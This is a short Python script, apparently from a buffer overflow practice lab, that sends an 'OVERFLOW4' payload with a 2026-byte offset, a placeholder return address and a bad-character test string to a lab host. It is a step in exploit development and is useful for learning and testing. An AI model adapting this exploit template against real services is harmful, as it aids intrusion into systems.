#!/usr/bin/env python3

import socket

host, port = "10.10.191.46", 1337

all_chars = bytearray(range(1,256))

# e.g., 
# bad_chars = [
# 	b"\x00",
# 	b"\x23",
# 	b"\x24",
# 	b"\x3c",
# 	b"\x3d",
# 	b"\x83",
# 	b"\x84",
# 	b"\xba",
# 	b"\xbb",
# ]

bad_chars = [
	b"\x00",
	b"\xa9",
	b"\x01",
	b"\x02"
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")

command = b"OVERFLOW4 "
length = 3000
offset = 2026
new_eip = b"BBBB"

payload = b"".join([
	command,
	b"A" * offset,
	new_eip,
	all_chars,
	b"C" * ( length - len(new_eip) - offset - len(all_chars)),
])

with socket.socket() as s:
	s.connect((host, port))
	# banner = s.recv(4096).decode("utf-8").strip()
	s.send(payload)
